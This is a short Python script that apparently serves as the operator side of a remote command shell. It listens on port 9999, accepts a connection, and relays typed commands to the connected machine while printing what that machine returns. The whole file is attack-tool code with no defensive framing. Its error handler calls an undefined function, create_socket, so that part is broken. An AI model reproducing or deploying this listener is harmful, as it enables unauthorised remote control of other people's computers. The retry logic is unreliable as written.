import socket
import time
import sys


def socket_create():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except:
        print("Unable to create socket")
        time.sleep(5)
        create_socket()

def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host,port))
        s.listen(5)
    except:
        print("Unable to bind a socket")
        time.sleep(5)
        socket_bind()

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established - "+address[0]+":"+str(address[1]))

    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        elif cmd == "":
            pass
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(28000),"latin-1")
            print(">"+client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
